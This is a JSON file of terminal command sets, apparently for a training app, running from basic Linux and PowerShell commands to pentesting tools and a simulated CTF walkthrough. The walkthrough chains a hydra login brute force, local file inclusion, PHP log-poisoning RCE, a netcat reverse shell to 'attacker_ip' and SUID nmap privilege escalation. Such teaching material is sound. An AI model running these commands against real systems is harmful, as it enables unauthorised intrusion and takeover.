{
    "Linux Commands - Beginner": {
        "name": "Beginner Linux Commands",
        "value": "linux-terminal-beginner",
        "type": "Linux-Commands",
        "commands": [
            {
                "command": "ls -l",
                "description": "Lists directory contents in long format."
            },
            {
                "command": "cd /home/user",
                "description": "Changes directory to the specified path."
            },
            {
                "command": "cat file.txt",
                "description": "Displays the content of file.txt."
            },
            {
                "command": "cp file1.txt file2.txt",
                "description": "Copies file1.txt to file2.txt."
            },
            {
                "command": "rm file.txt",
                "description": "Deletes file.txt."
            },
            {
                "command": "mkdir new_folder",
                "description": "Creates a new directory called new_folder."
            },
            {
                "command": "rmdir old_folder",
                "description": "Removes the directory old_folder."
            },
            {
                "command": "echo 'Hello World' > file.txt",
                "description": "Writes 'Hello World' to file.txt."
            },
            {
                "command": "mv oldname.txt newname.txt",
                "description": "Renames or moves oldname.txt to newname.txt."
            },
            {
                "command": "scp file.txt user@host:/path",
                "description": "Securely copies file.txt to the specified path on the host."
            }
        ]
    },
    "Linux Commands - Intermediate": {
        "name": "Intermediate Linux Commands",
        "value": "linux-terminal-intermediate",
        "type": "Linux-Commands",
        "commands": [
            {
                "command": "find /home/user -name '*.txt'",
                "description": "Finds all .txt files in the /home/user directory."
            },
            {
                "command": "grep 'pattern' file.txt",
                "description": "Searches for 'pattern' in file.txt."
            },
            {
                "command": "tar -czvf archive.tar.gz /path/to/directory",
                "description": "Creates a compressed tarball archive of the specified directory."
            },
            {
                "command": "chmod 755 script.sh",
                "description": "Changes permissions of script.sh to rwxr-xr-x."
            },
            {
                "command": "chown user:group file.txt",
                "description": "Changes the owner and group of file.txt."
            },
            {
                "command": "ps aux | grep 'process'",
                "description": "Displays processes matching 'process'."
            },
            {
                "command": "du -h /path/to/directory",
                "description": "Displays the disk usage of the specified directory in human-readable format."
            },
            {
                "command": "df -h",
                "description": "Displays disk space usage of all mounted filesystems in human-readable format."
            },
            {
                "command": "curl -O http://example.com/file.txt",
                "description": "Downloads file.txt from the specified URL."
            },
            {
                "command": "wget http://example.com/file.txt",
                "description": "Downloads file.txt from the specified URL using wget."
            }
        ]
    },
    "Linux Commands - Advanced": {
        "name": "Advanced Linux Commands",
        "value": "linux-terminal-advanced",
        "type": "Linux-Commands",
        "commands": [
            {
                "command": "iptables -L",
                "description": "Lists all current iptables rules."
            },
            {
                "command": "systemctl restart apache2",
                "description": "Restarts the Apache2 service."
            },
            {
                "command": "mount /dev/sdb1 /mnt/usb",
                "description": "Mounts the /dev/sdb1 partition to the /mnt/usb directory."
            },
            {
                "command": "umount /mnt/usb",
                "description": "Unmounts the /mnt/usb directory."
            },
            {
                "command": "ssh user@host",
                "description": "Initiates an SSH session with the specified host."
            },
            {
                "command": "rsync -avz /source/dir /destination/dir",
                "description": "Synchronizes files from source directory to destination directory using rsync."
            },
            {
                "command": "crontab -e",
                "description": "Edits the current user's crontab file."
            },
            {
                "command": "top",
                "description": "Displays real-time system resource usage."
            },
            {
                "command": "htop",
                "description": "Displays an interactive process viewer (if installed)."
            },
            {
                "command": "journalctl -xe",
                "description": "Displays detailed logs of the systemd journal."
            }
        ]
    },
    "PowerShell Commands - Beginner": {
        "name": "Beginner PowerShell Commands",
        "value": "powershell-terminal-beginner",
        "type": "PowerShell-Commands",
        "commands": [
            {
                "command": "Get-Help Get-ChildItem -Detailed",
                "description": "Shows detailed help for a cmdlet (how to learn in-PS)."
            },
            {
                "command": "Get-Command *service*",
                "description": "Finds cmdlets/aliases/functions matching a pattern."
            },
            {
                "command": "Get-ChildItem -Force",
                "description": "Lists files (including hidden) in the current directory."
            },
            {
                "command": "Set-Location C:\\Users\\Public",
                "description": "Changes the working directory."
            },
            {
                "command": "Get-Content .\\notes.txt",
                "description": "Reads a fileâ€™s contents."
            },
            {
                "command": "Set-Content .\\hello.txt 'Hello World'",
                "description": "Creates/overwrites a file with text."
            },
            {
                "command": "Add-Content .\\hello.txt 'Another line'",
                "description": "Appends a line to a file."
            },
            {
                "command": "New-Item -ItemType Directory .\\Logs",
                "description": "Creates a new folder."
            },
            {
                "command": "Copy-Item .\\file1.txt .\\file2.txt",
                "description": "Copies a file."
            },
            {
                "command": "Move-Item .\\oldname.txt .\\newname.txt",
                "description": "Renames or moves a file."
            },
            {
                "command": "Remove-Item .\\file2.txt",
                "description": "Deletes a file."
            },
            {
                "command": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
                "description": "Shows top 5 CPU-consuming processes."
            }
        ]
    },
    "PowerShell Commands - Intermediate": {
        "name": "Intermediate PowerShell Commands",
        "value": "powershell-terminal-intermediate",
        "type": "PowerShell-Commands",
        "commands": [
            {
                "command": "Get-Service | Where-Object {$_.Status -eq 'Running'} | Sort-Object DisplayName",
                "description": "Lists running services, sorted by name."
            },
            {
                "command": "Restart-Service Spooler",
                "description": "Restarts a specific service."
            },
            {
                "command": "Get-EventLog -LogName System -Newest 20",
                "description": "Reads the latest 20 System log entries."
            },
            {
                "command": "Get-WinEvent -FilterHashtable @{LogName='Application'; Id=1000} -MaxEvents 10",
                "description": "Filters events by log and ID."
            },
            {
                "command": "Get-ChildItem C:\\ -Filter *.log -Recurse -ErrorAction SilentlyContinue",
                "description": "Recursively finds .log files (suppressing errors)."
            },
            {
                "command": "Select-String -Path .\\*.log -Pattern 'ERROR' -SimpleMatch",
                "description": "Greps for 'ERROR' in local log files."
            },
            {
                "command": "Invoke-WebRequest https://example.com -OutFile .\\page.html",
                "description": "Downloads a web page to a file."
            },
            {
                "command": "Invoke-RestMethod https://api.github.com/repos/PowerShell/PowerShell/releases/latest | Select-Object tag_name",
                "description": "Calls a JSON API and selects a field."
            },
            {
                "command": "Get-Process | Select-Object Name,Id,WS | Export-Csv .\\procs.csv -NoTypeInformation",
                "description": "Exports selected process info to CSV."
            },
            {
                "command": "Import-Csv .\\procs.csv | Where-Object {[int]$_.WS -gt 100000000}",
                "description": "Reads CSV and filters by working set."
            }
        ]
    },
    "PowerShell Commands - Advanced": {
        "name": "Advanced PowerShell Commands",
        "value": "powershell-terminal-advanced",
        "type": "PowerShell-Commands",
        "commands": [
            {
                "command": "Enable-PSRemoting -Force",
                "description": "Enables PowerShell remoting on the local machine."
            },
            {
                "command": "Test-WSMan localhost",
                "description": "Verifies WS-Management/Remoting is working."
            },
            {
                "command": "Enter-PSSession -ComputerName SERVER01",
                "description": "Starts an interactive remote session."
            },
            {
                "command": "Invoke-Command -ComputerName SERVER01 -ScriptBlock { Get-Process | Select-Object -First 3 }",
                "description": "Runs a script block on a remote host."
            },
            {
                "command": "New-PSSession -ComputerName SERVER01 | Get-PSSession",
                "description": "Creates and lists persistent remote sessions."
            },
            {
                "command": "Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,OSArchitecture",
                "description": "Queries system info via CIM (WMI)."
            },
            {
                "command": "Start-Job -ScriptBlock { Get-Service; Start-Sleep 2 }",
                "description": "Runs a background job."
            },
            {
                "command": "Get-Job | Receive-Job -Wait -AutoRemoveJob",
                "description": "Collects job output and cleans it up."
            },
            {
                "command": "New-Item -Path HKCU:\\Software\\Demo -Force",
                "description": "Creates a registry key (current user hive)."
            },
            {
                "command": "Compress-Archive -Path .\\Logs -DestinationPath .\\Logs.zip -Force",
                "description": "Zips a folder into a .zip file."
            },
            {
                "command": "Start-Transcript -Path .\\session.log; Stop-Transcript",
                "description": "Records the session to a log file."
            },
            {
                "command": "$acl = Get-Acl .\\secret.txt; $rule = New-Object System.Security.AccessControl.FileSystemAccessRule('Users','Read','Allow'); $acl.AddAccessRule($rule); Set-Acl .\\secret.txt $acl",
                "description": "Adds a read ACL rule to a file (ACL basics)."
            }
        ]
    },
    "Pentesting Commands": {
        "name": "Pentesting Commands",
        "value": "linux-terminal-pentesting",
        "type": "Pentesting-Commands",
        "commands": [
            {
                "command": "nmap -sS -p 1-65535 target",
                "description": "Performs a stealth scan on all ports of the target."
            },
            {
                "command": "sqlmap -u 'http://target.com/vuln.php?id=1' --dbs",
                "description": "Finds databases on the target vulnerable to SQL injection."
            },
            {
                "command": "msfconsole",
                "description": "Launches the Metasploit Framework console."
            },
            {
                "command": "hydra -l admin -P passwords.txt target ssh",
                "description": "Brute forces SSH login on the target using the specified username and password list."
            },
            {
                "command": "dirb http://target.com/",
                "description": "Scans the target website for directories."
            },
            {
                "command": "gobuster dir -u http://target.com/ -w wordlist.txt",
                "description": "Uses Gobuster to brute force directories on the target website."
            },
            {
                "command": "nc -lvnp 4444",
                "description": "Sets up a Netcat listener on port 4444."
            },
            {
                "command": "openssl s_client -connect target:443",
                "description": "Opens an SSL/TLS connection to the target on port 443."
            },
            {
                "command": "john --wordlist=passwords.txt hashes.txt",
                "description": "Cracks passwords using the specified wordlist and hashes."
            },
            {
                "command": "searchsploit apache 2.4",
                "description": "Searches for exploits related to Apache 2.4."
            }
        ]
    },
    "Simulated CTF Walkthrough 1": {
        "name": "Simulated CTF Walkthrough 1",
        "value": "linux-terminal-box1",
        "type": "CTF-Walkthroughs",
        "commands": [
            {
                "command": "nmap -sV -sC targetsite.com -p- --script=vuln",
                "description": "Welcome to CTF Walkthrough 1!\nFirst, we will begin with scanning it for open ports using Nmap.\nThis command will run a service version detection (-sV), default scripts (-sC), and scan all ports (-p-).\nThe --script=vuln option will run vulnerability scripts to identify potential weaknesses."
            },
            {
                "command": "whatweb http://targetsite.com:8080",
                "description": "We found an HTTP port open on port 8080. Let's use WhatWeb to identify the site software and gather information about the web server. This will help us determine if we can run any custom dictionaries specifically for this site."
            },
            {
                "command": "curl -O http://targetsite.com:8080/robots.txt",
                "description": "Let's check the robots.txt file to see if there are any interesting paths or directories that the website owner doesn't want search engines to index. This file can sometimes reveal hidden parts of the website."
            },
            {
                "command": "feroxbuster -u http://targetsite.com:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
                "description": "Nothing interesting in the robots.txt file. Let's run a directory scan using Feroxbuster to discover hidden directories and files. We'll use a medium-sized wordlist from SecLists to cover a broad range of potential paths."
            },
            {
                "command": "whatweb http://targetsite.com:8080/administration",
                "description": "We found an administration panel at /administration. Let's use WhatWeb again to see if it's running a specific software version that might have known vulnerabilities or default credentials."
            },
            {
                "command": "curl http://targetsite.com:8080/administration",
                "description": "Upon investigating the administration panel, we discovered it's running 'Charm CMS'. A quick Google search reveals that the default admin username is 'administrator'. Let's inspect how the login request is being sent by using curl to fetch the login page."
            },
            {
                "command": "hydra -l administrator -P /usr/share/wordlists/rockyou.txt targetsite.com http-post-form \"/administration:index=Login failed\"",
                "description": "Based on the inspection, we identified the login form fields and crafted a Hydra command to brute-force the login. The -l option sets the username to 'administrator', and -P specifies the path to the password wordlist (rockyou.txt). The http-post-form module is used to specify the login form parameters and the failure message ('Login failed')."
            },
            {
                "command": "curl http://targetsite.com:8080/administration/panel",
                "description": "Success! We've gained access to the administration panel. While exploring, we find a field vulnerable to Local File Inclusion (LFI). Let's use curl commands to look for sensitive files."
            },
            {
                "command": "curl http://targetsite.com:8080/administration/panel?file=/etc/passwd",
                "description": "Using the LFI vulnerability, let's try to access the /etc/passwd file to gather information about the system users."
            },
            {
                "command": "curl http://targetsite.com:8080/administration/panel?file=/var/log/apache2/access.log",
                "description": "To escalate this LFI to Remote Code Execution (RCE), we will inject a malicious payload into the Apache access log by setting a custom User-Agent header. First, let's access the log file."
            },
            {
                "command": "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://targetsite.com:8080",
                "description": "Inject the PHP code into the Apache log using the User-Agent header. This code will allow us to execute commands remotely."
            },
            {
                "command": "curl http://targetsite.com:8080/administration/panel?file=/var/log/apache2/access.log&cmd=id",
                "description": "Now, let's request the Apache access log file and append the cmd parameter to execute the 'id' command, verifying our remote code execution."
            },
            {
                "command": "nc -lvnp 4444",
                "description": "Set up a Netcat listener on port 4444 to catch the reverse shell. This will allow us to gain interactive access to the target system."
            },
            {
                "command": "curl http://targetsite.com:8080/administration/panel?file=/var/log/apache2/access.log&cmd=nc -e /bin/bash attacker_ip 4444",
                "description": "Use the RCE to send a reverse shell to our Netcat listener. Replace 'attacker_ip' with your actual IP address."
            },
            {
                "command": "which python python2 python3",
                "description": "Once we have a shell, check for installed Python versions. This will help us in upgrading our shell to a more stable interactive one."
            },
            {
                "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "description": "Upgrade the shell using Python. This command will spawn a pseudo-terminal, making our shell experience much better."
            },
            {
                "command": "find / -perm -4000 -type f 2>/dev/null",
                "description": "Search for files with the SUID bit set. These files can potentially be exploited for privilege escalation if they are misconfigured."
            },
            {
                "command": "sudo install -m =xs $(which nmap) .",
                "description": "Copy the nmap binary to the current directory with the SUID bit set. This gives us elevated privileges when running nmap."
            },
            {
                "command": "LFILE=file_to_write",
                "description": "Set a variable LFILE to the name of the file we want to write to. This will be used in the next command to exploit the SUID nmap."
            },
            {
                "command": "./nmap -oG=$LFILE DATA",
                "description": "Use nmap's output option to write arbitrary data to the file specified by LFILE. This can be used to escalate privileges or execute further commands."
            }
        ]
    }
}